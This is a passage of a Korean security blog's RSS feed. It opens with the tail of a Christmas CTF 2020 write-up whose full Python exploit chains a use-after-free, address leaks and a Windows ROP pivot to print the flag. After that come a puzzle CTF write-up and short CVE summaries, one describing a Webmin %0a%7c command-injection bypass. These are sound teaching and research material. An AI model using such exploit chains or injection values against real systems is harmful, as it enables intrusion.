class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ucrtbase_free))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ucrtbase = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0xe940</span>print(<span class="hljs-string">&quot;image base : &quot;</span>+hex(imagebase))print(<span class="hljs-string">&quot;ntdll base : &quot;</span>+hex(ntdll))print(<span class="hljs-string">&quot;ucrtbase base : &quot;</span>+hex(ucrtbase))p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>)</code></pre><p><img src="/2020/12/29/l0ch/address_book/12.png"></p><p>이제 필요한 주소들도 모두 구했고 eip도 컨트롤할 수 있으니, ROP chain만 구성하면 됩니다.</p><p><code>mov rsp, [rcx+152]; mov rcx, [rcx+248]; jmp rcx;</code> 로 rsp를 현재 페이로드가 올라와 있는 주소로 pivot 한뒤 <code>read</code>, <code>write</code>를 차례로 호출하면 flag를 출력할 수 있습니다!</p><p><img src="/2020/12/29/l0ch/address_book/13.png"></p><h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">addAddr</span>(<span class="hljs-params">name, address, city</span>):</span>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)print(p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>))p.sendline(name)print(p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>))p.sendline(address)print(p.recvuntil(<span class="hljs-string">&#x27;:&#x27;</span>))p.sendline(city)print(p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">listAddr</span>(<span class="hljs-params">idx</span>):</span>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)print(p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>))p.sendline(str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">deleteAddr</span>(<span class="hljs-params">idx</span>):</span>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))p.sendline(str(idx))print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">restoreAddr</span>(<span class="hljs-params">idx</span>):</span>p.sendline(<span class="hljs-string">&quot;4&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))p.sendline(str(idx))print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">modifyAddr</span>(<span class="hljs-params">idx, item, new</span>):</span>p.sendline(<span class="hljs-string">&quot;5&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(str(idx))p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(str(item))p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)p.sendline(new)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p = remote(<span class="hljs-string">&quot;host&quot;</span>,<span class="hljs-number">55555</span>)print(p.recv())p.sendline(<span class="hljs-string">&quot;L0ch&quot;</span>)print(p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>))addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>)<span class="hljs-comment"># node 3-&gt;4 , node 4-&gt;3</span>deleteAddr(<span class="hljs-number">4</span>)deleteAddr(<span class="hljs-number">3</span>)restoreAddr(<span class="hljs-number">4</span>)restoreAddr(<span class="hljs-number">3</span>)<span class="hljs-comment"># reference count ingeter overflow - free addressbook</span>listAddr(<span class="hljs-number">3275</span>)<span class="hljs-comment"># get heap address</span>p.recvuntil(<span class="hljs-string">&quot;saved in &quot;</span>)obj_leak = int(p.recvuntil(<span class="hljs-string">&quot;\\r\\n&quot;</span>),<span class="hljs-number">16</span>)print(obj_leak)<span class="hljs-comment"># allocation after addressbook free</span><span class="hljs-comment"># overwrite addressbook-&gt;head to recyclebin, get recyclebin&#x27;s vtable</span><span class="hljs-comment"># not reliable leak, but address not changed before reboot</span>context.log_level = <span class="hljs-string">&quot;debug&quot;</span>addAddr(<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;AAAA&quot;</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span> + p64(obj_leak+<span class="hljs-number">0x250</span>))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)leak = p.recv(<span class="hljs-number">6</span>)<span class="hljs-keyword">if</span> leak[<span class="hljs-number">5</span>] != <span class="hljs-string">&quot;\\x7f&quot;</span>:print(<span class="hljs-string">&quot;vtable address not leaked&quot;</span>)exit()leak = u64(leak+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>)imagebase = leak - <span class="hljs-number">0x6960</span>ntdll_rtlinit = imagebase + <span class="hljs-number">0x6060</span>ucrtbase_free = imagebase + <span class="hljs-number">0x61f0</span><span class="hljs-comment"># leak ntdll</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ntdll_rtlinit))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ntdll = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0x6f270</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">3</span>,<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">16</span>+p64(ucrtbase_free))listAddr(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">&quot;Name : &quot;</span>)ucrtbase = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">&quot;\\x00\\x00&quot;</span>) - <span class="hljs-number">0xe940</span>print(<span class="hljs-string">&quot;image base : &quot;</span>+hex(imagebase))print(<span class="hljs-string">&quot;ntdll base : &quot;</span>+hex(ntdll))print(<span class="hljs-string">&quot;ucrtbase base : &quot;</span>+hex(ucrtbase))p.recvuntil(<span class="hljs-string">&#x27;&gt;&#x27;</span>)pivot = ntdll + <span class="hljs-number">0xA0E24</span> <span class="hljs-comment"># mov rsp, [rcx+152]; mov rcx, [rcx+248]; jmp rcx;</span>ret = ntdll + <span class="hljs-number">0x144F</span>add_rsp_28h = ntdll + <span class="hljs-number">0x3EDC</span>ppr = ntdll + <span class="hljs-number">0x8B8F0</span> <span class="hljs-comment"># pop rdx rcx r8 r9 r10 r11 ret</span>read = ucrtbase + <span class="hljs-number">0x17BC0</span>write = ucrtbase + <span class="hljs-number">0x174C0</span> <span class="hljs-comment"># pivot</span>payload = p64(pivot)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(ret)payload += p64(<span class="hljs-number">0</span>)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(ppr)payload += p64(obj_leak+<span class="hljs-number">0x240</span>)<span class="hljs-comment"># arg 2, buffer </span>payload += p64(<span class="hljs-number">0x3</span>)<span class="hljs-comment"># arg 1, fd</span>payload += p64(<span class="hljs-number">0x30</span>)<span class="hljs-comment"># arg 3, size</span>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># dummy</span>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># dummy</span>payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># dummy</span>payload += p64(read)payload += p64(add_rsp_28h)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)<span class="hljs-comment"># write flag</span>payload += p64(ppr)payload += p64(obj_leak+<span class="hljs-number">0x240</span>)payload += p64(<span class="hljs-number">1</span>)payload += p64(<span class="hljs-number">0x30</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(<span class="hljs-number">0</span>)payload += p64(write)<span class="hljs-comment"># overwrite vtable</span>modifyAddr(<span class="hljs-number">-1</span>,<span class="hljs-number">1</span>,p64(obj_leak+<span class="hljs-number">152</span>))p.sendline(<span class="hljs-string">&quot;5&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;-1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)p.sendline(p64(obj_leak+<span class="hljs-number">152</span>))p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;2&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)p.sendline(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">136</span>+p64(obj_leak+<span class="hljs-number">168</span>)+payload)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;4&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;6&quot;</span>)p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)p.sendline(<span class="hljs-string">&quot;1&quot;</span>)print(p.recv())</code></pre>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Write-Up/">Write-Up</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/write-up/">write-up</category>
      
      <category domain="https://hackyboiz.github.io/tags/christmas-ctf/">christmas ctf</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/29/l0ch/address_book/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Write-Up] Christmas CTF 2020 - Picky Eater</title>
      <link>https://hackyboiz.github.io/2020/12/29/l0ch/picky_eater/</link>
      <guid>https://hackyboiz.github.io/2020/12/29/l0ch/picky_eater/</guid>
      <pubDate>Tue, 29 Dec 2020 12:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;picky_eater는 snake game을 윈도우 콘솔로 구현한 미스크 문제입니다.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;옛날옛날에 먹고싶은 것만 먹는 편식쟁이 뱀이 있었어요 편식쟁이 뱀은 먹기 싫은걸 먹으면 티를 낸답니다!&lt;/p&gt;
&lt;/block</description>
        
      
      
      
      <content:encoded><![CDATA[<p>picky_eater는 snake game을 윈도우 콘솔로 구현한 미스크 문제입니다.</p><blockquote><p>옛날옛날에 먹고싶은 것만 먹는 편식쟁이 뱀이 있었어요 편식쟁이 뱀은 먹기 싫은걸 먹으면 티를 낸답니다!</p></blockquote><p>위와 같은 문제의 디스크립션과 함께 바이너리가 주어집니다.</p><p><img src="/2020/12/29/l0ch/picky_eater/1.png"></p><p>바이너리를 실행하면 위와 같은 화면이 나오는데, 아무키나 누르면 snake 게임이 시작됩니다.</p><p>snake 게임의 룰은 간단합니다! 처음엔 짧은 길이의 뱀이 나오는데, 이 뱀을 컨트롤해 화면상에 나오는 먹이를 먹으면 뱀 길이가 길어지고 뱀의 속도가 빨라지는 간단한 룰이죠</p><p><img src="/2020/12/29/l0ch/picky_eater/2.png"></p><p>뱀의 먹이로는 문자가 하나씩 나옵니다. 문자들을 하나씩 모아보면<code>XMAS&#123;$0lo_P1ickyY_$n@4k3?!&#125;</code> 라는 플래그가 나오는데, 이 플래그를 인증하면 인증에 실패하게 됩니다.</p><p>진짜 플래그는 게임의 규칙을 통해 얻을 수 있는데, 문제의 디스크립션을 다시 한 번 볼까요?</p><blockquote><p>옛날옛날에 먹고싶은 것만 먹는 편식쟁이 뱀이 있었어요 편식쟁이 뱀은 먹기 싫은걸 먹으면 티를 낸답니다!</p></blockquote><p>먹이를 먹으면 다음과 같은 변화가 발생합니다.</p><ol><li>길이가 길어짐</li><li>속도가 빨라짐</li></ol><p>속도는 육안으로 확인하기 어려울 것 같으니, 길이와 관련된 규칙을 생각하며 플레이해봅시다.</p><p>처음 길이는 머리를 제외하고 4칸입니다.</p><p><img src="/2020/12/29/l0ch/picky_eater/3.png"></p><p>첫 번째 먹이인 <code>X</code> 를 먹고 P로 일시정지를 해보겠습니다.</p><p>뱀의 길이가 6으로 두 칸 길어졌네요. 이렇게 <code>XMAS&#123;$</code> 까지 먹어보겠습니다.</p><p><img src="/2020/12/29/l0ch/picky_eater/4.png"></p><p>길이가 16이니까 XMAS{$ 를 먹었을땐 모두 길이가 길어진 것을 확인이 가능합니다. </p><p><img src="/2020/12/29/l0ch/picky_eater/5.png"></p><p>그러나 <code>0</code> 을 먹었을때는 길이가 16 그대로군요. 이렇게  <code>XMAS&#123;$0lo_P1ickyY_$n@4k3?!&#125;</code> 중 먹었을 때 길이가 늘어나지 않는 문자를 빼면 <code>XMAS&#123;$o_P1cky_$n4k3!&#125;</code> 라는 진짜 플래그가 나오게 됩니다!</p><p><img src="/2020/12/29/l0ch/picky_eater/6.png"></p><p>참고로 IDA에서 분석해보면 fake flag가 있고</p><p><img src="/2020/12/29/l0ch/picky_eater/7.png"></p><p>플래그 index 가 있는 배열이 있어 이걸 보고 풀어도 됩니다.</p><p>여담으로.. fake flag를 너무 진짜처럼 넣어놓는 바람에.. picky_eater가 공개되자마자 플래그 인증요청과 문의가 폭주해서 정신을 못차렸었네요 하하..</p><p><img src="/2020/12/29/l0ch/picky_eater/8.png"></p><blockquote><p>간단요약짤 - picky_eater 공개 10분 뒤 문제 별 플래그 인증요청횟수(태그 클라우드)</p></blockquote><p>플래그 인증 관련해서 문제가 없다는 공지를 올린 이후 많은 팀들이 풀어주셨지만, 문제 출제 중 미처 생각 못한 점 때문에 참가자분들께 혼란을 드려 반성하고 있습니다 ㅠㅠㅠ</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Write-Up/">Write-Up</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/write-up/">write-up</category>
      
      <category domain="https://hackyboiz.github.io/tags/christmas-ctf/">christmas ctf</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/29/l0ch/picky_eater/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-7468: FreeBSD local privilege escalation</title>
      <link>https://hackyboiz.github.io/2020/12/29/l0ch/2020-12-29/</link>
      <guid>https://hackyboiz.github.io/2020/12/29/l0ch/2020-12-29/</guid>
      <pubDate>Tue, 29 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2020/12/21/cve-202</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/12/21/cve-2020-7468-turning-imprisonment-to-advantage-in-the-freebsd-ftpd-chroot-jail">CVE-2020-7468: TURNING IMPRISONMENT TO ADVANTAGE IN THE FREEBSD FTPD CHROOT JAIL</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>FreeBSD ftpd</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>FreeBSD의 ftp 데몬에서 root 로 권한 상승이 가능한 취약점이 발견되었습니다.</p><p>취약점은 <code>chroot</code> 함수의 로그인 처리 부분의 결함으로 인해 발생합니다.</p><p><code>chroot</code> 함수에서 <code>chdir</code>이 실패할 경우 ftpd는 <code>chroot</code>의 jail에서 새로운 로그인 연결을 기다립니다. 이를 이용해 강제로 <code>chdir</code>이 실패하도록 유도하면 해커가 업로드한 파일을 시스템 파일인 것처럼 속일 수 있습니다.</p><p>취약점의 상세 공격 단계는 다음과 같습니다.</p><ol><li>해커가 FTP 유저 계정으로 로그인합니다.</li><li><code>etc/spwd.db</code> 에 임의의 root 패스워드를 설정해 업로드합니다.</li><li><code>chmod 0</code> 으로 홈 디렉터리에 대한 권한을 변경하고 유저 계정으로 다시 로그인합니다.</li><li>3번으로 인해 로그인 중 <code>chdir</code>이 실패하고 <code>ftpd chroot jail</code> 내부에서 새로운 연결을 기다립니다. 이후 모든 시스템 파일 액세스는 해커 계정의 홈 디렉터리를 기준으로 이루어집니다.</li><li>결과적으로 이후 root로 로그인할 때 해커가 업로드한 <code>etc/spwd.db</code> 의 root 패스워드 테이블을 참조해 패스워드를 검증하고 해커가 root 계정에 접근할 수 있습니다.</li></ol><p>해당 취약점을 악용하면 리버스쉘을 실행시키는 명령어를 포함한 파일을 업로드해 root 권한으로 쉘을 실행하고, chroot jail을 벗어나 임의의 명령어 또한 실행할 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/FreeBSD/">FreeBSD</category>
      
      <category domain="https://hackyboiz.github.io/tags/local-privilege-escalation/">local privilege escalation</category>
      
      <category domain="https://hackyboiz.github.io/tags/ftpd/">ftpd</category>
      
      <category domain="https://hackyboiz.github.io/tags/chroot/">chroot</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/29/l0ch/2020-12-29/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-35606: Arbitrary Command Execution in Webmin</title>
      <link>https://hackyboiz.github.io/2020/12/28/idioth/2020-12-28/</link>
      <guid>https://hackyboiz.github.io/2020/12/28/idioth/2020-12-28/</guid>
      <pubDate>Mon, 28 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.pentest.com.tr/exploits/Webmin-1962-PU-Escape</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.pentest.com.tr/exploits/Webmin-1962-PU-Escape-Bypass-Remote-Command-Execution.html">Webmin-1962-PU-Escape-Bypass-Remote-Command-Exectuion</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Wemin 1.962 이하 버전</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Webmin에서 Remote Command Execution 취약점이 발견되었습니다. 해당 취약점을 통해 패키지 업데이트 모듈을 사용할 수 있는 모든 유저가 root 권한으로 arbitrary command를 실행할 수 있습니다. <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12840">CVE-2019-12840</a>에 대한 필터링은 package name 변수가 system command 안에 직접적으로 들어가므로 URL encoding을 통해 우회할 수 있습니다.(ex. command line을 한 줄 아래에서 실행)</p><p><code>u</code> 파라미터는 <code>update.cgi</code>에서 <code>@pkgs</code> 변수에 들어가서 여러 연산을 수행합니다. <code>update.cgi</code>의 함수들은 <code>package-updates-lib.pl</code>에서 호출되는데, 그중 <code>package_install(package-name, [system], [new-install])</code>은 update system이나 Wemin을 통해 패키지를 설치할 수 있고 업데이트된 패키지 목록을 반환합니다.</p><p>패지키를 설치할 때 CVE-2019-12840에 대한 조치로 <code>s/\\(-)|\\(.)/string/g;</code> 필터링이 걸려있습니다. 패키지 이름은 http request 변수이므로 <code>%0a</code>나 <code>%0c</code> 등을 통해 escape가 가능합니다. 패키지 이름 뒤에 <code>%7c</code> 등으로 pipe나 <code>.</code>을 추가하면 그 부분에 <code>\</code> 백 슬래시가 추가되어 명령 실행이 불가능하지만 <code>%0a%7c</code> 등으로 새로운 command line에서 실행하면 <code>\</code>가 무시되고 정상적으로 arbitrary command execution이 가능합니다.</p><p><a href="https://pentest.com.tr/blog/webmin_pu_escape_bypass_rce.rb">해당 취약점에 대한 Metasploit code</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/command-execution/">command execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve-2019-12840/">cve-2019-12840</category>
      
      <category domain="https://hackyboiz.github.io/tags/webmin/">webmin</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/28/idioth/2020-12-28/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2020-8437: uTorrent vulnerability, misparse to RCE</title>
      <link>https://hackyboiz.github.io/2020/12/19/fabu1ous/2020-12-19/</link>
      <guid>https://hackyboiz.github.io/2020/12/19/fabu1ous/2020-12-19/</guid>
      <pubDate>Sat, 19 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.whtaguy.com/2020/09/utorrent-cve-2020-8437-v</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.whtaguy.com/2020/09/utorrent-cve-2020-8437-vulnerability.html">CVE-2020-8437 Vulnerability And Exploit Overview</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>uTorrent &lt;= 3.5.5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2020-8437은 uTorrent의 peer끼리 주고받는 BitTorrent protocol에서 발견된 취약점입니다. BitTorrent protocol을 시작하는 Handshake 페킷에는 bencoded dictionary를 담고 있는 <code>M field</code>가 존재합니다.</p><p>bencoded dictionary는 python dictionary와 매우 유사하며 Key와 Value를 갖습니다. 여기서 중요한 점은 nested(중첩된) dictionary의 존재인데, 즉 Value가 또 다른 하나의 dictionary가 될 수 있습니다. 중첩된 dictionary를 파싱하는 과정에서 발생하는 취약점입니다.</p><pre><code class="hljs Bencoded">d4:keyA 6:valueA4:keyBd5:apple 3:pie6:orange 5:juiceee</code></pre><p>충접된 dictionary를 파싱 할 때 몇 번째 layer에서 파싱하고 있는지를 32bit 크기의 <code>bit field</code>에 기록합니다. layer를 하나 들어갈 때마다 이 bit field에 한 비트씩 플래그를 설정합니다( ex. 2번째 layer 파싱 중 : 0000 0000 0000 0011 ). 만약 layer가 32보다 많이 중첩된 dictionary를 파싱하게 된다면 Crash가 발생합니다.</p><p>malicious bencoded dictionary를 담은 <code>.torrent</code>를 받는 peer의 uTorrent는 nested dictionary를 파싱하는 과정에서 Crash가 발생하고 RCE까지 이어질 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/utorrent/">utorrent</category>
      
      <category domain="https://hackyboiz.github.io/tags/misparse/">misparse</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/19/fabu1ous/2020-12-19/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Adobe Reader UAF vulnerability</title>
      <link>https://hackyboiz.github.io/2020/12/18/l0ch/2020-12-18/</link>
      <guid>https://hackyboiz.github.io/2020/12/18/l0ch/2020-12-18/</guid>
      <pubDate>Fri, 18 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2020/9/2/cve-2020-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2020/9/2/cve-2020-9715-exploiting-a-use-after-free-in-adobe-reader">CVE-2020-9715: EXPLOITING A USE-AFTER-FREE IN ADOBE READER</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Adobe Reader </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Adobe Reader에서 원격 코드 실행까지 가능한 UAF 취약점이 발견되었습니다.</p><p><code>ESObjects</code> 는 Adobe Reader의 <code>EScript</code> 객체입니다. <code>ESObjects</code>를 구성할 때 해당 객체에 대한 포인터가 캐시에 저장됩니다. 동일한 PDDoc구조, 이름을 가진 <code>ESObject</code>를 구성할 때 새로 할당하는 대신 캐시의 <code>ESObject</code> 포인터가 사용되는데, 이때 UAF 취약점이 발생합니다.</p><p><code>ESObject</code>가 할당되고 객체 캐시에 추가될 때 <code>ESString type</code>은 ANSI입니다. 객체 캐시에서 <code>ESObject</code>를 삭제할 때 <code>ESString</code> 값으로 찾아 삭제하는데, 삭제할 항목을 검색할 때  UNICODE로 입력받아 <code>ESString</code> 항목을 찾지 못하게 됩니다. 결과적으로 <code>ESObject</code> 포인터는 삭제되지 않고, 이를 재사용할 수 있습니다.</p><p>해당 취약점은 ArrayBuffer byteLength corruption과 heap spray로 트리거해 RCE가 가능합니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/javascript/">javascript</category>
      
      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
      
      <category domain="https://hackyboiz.github.io/tags/adobe-reader/">adobe reader</category>
      
      <category domain="https://hackyboiz.github.io/tags/heap-spray/">heap spray</category>
      
      
      <comments>https://hackyboiz.github.io/2020/12/18/l0ch/2020-12-18/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] Microsoft Teams Updater Living off the Land</title>
      <link>https://hackyboiz.github.io/2020/12/17/idioth/2020-12-17/</link>
      <guid>https://hackyboiz.github.io/2020/12/17/idioth/2020-12-17/</guid>
      <pubDate>Thu, 17 Dec 2020 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.trustwave.com/en-us/resources/blogs/spiderlab</description>
        
      
      
      
